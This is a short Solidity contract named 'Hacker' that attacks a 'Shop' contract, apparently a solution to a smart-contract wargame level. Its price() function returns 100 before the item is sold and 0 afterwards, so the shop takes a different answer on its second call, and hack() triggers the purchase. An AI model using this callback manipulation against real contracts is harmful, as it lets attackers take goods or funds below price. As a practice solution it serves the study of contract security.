// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "./Shop.sol";


contract Hacker {

    Shop public shop;

    constructor(address _shopAddress) public {
        shop = Shop(_shopAddress);
    }
    
    function price() external view returns (uint) {
        if (!shop.isSold()) {
            return(100);
        } else {
            return(0);
        }
    }

    function hack() external {
        shop.buy();
    }
}